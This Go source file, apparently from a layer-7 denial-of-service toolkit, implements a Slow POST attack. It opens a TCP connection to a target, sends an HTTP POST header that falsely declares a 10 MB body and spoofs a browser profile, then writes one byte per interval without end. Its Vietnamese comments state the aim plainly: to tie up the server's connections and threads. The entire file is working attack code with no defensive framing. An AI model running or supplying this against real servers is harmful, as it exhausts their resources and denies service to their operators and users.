package l7

import (
	"context"
	"fmt"
	"net"
	"time"
)

// SlowPost: gửi body từng byte, Content-Length cực lớn.
// Server chờ đủ body -> ngốn conn + thread.
func SlowPost(ctx context.Context, host, path string, profile Profile, interval int, stop <-chan struct{}) error {
	conn, err := net.DialTimeout("tcp", host, 10*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	header := fmt.Sprintf(
		"POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"+
			"Accept: %s\r\nContent-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: 10000000\r\nConnection: keep-alive\r\n\r\n",
		path, host, profile.UserAgent, profile.Accept,
	)
	if _, err := conn.Write([]byte(header)); err != nil {
		return err
	}

	// gửi 1 byte mỗi interval, mãi không đủ 10MB
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-stop:
			return nil
		default:
		}
		if _, err := conn.Write([]byte{'a'}); err != nil {
			return err
		}
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}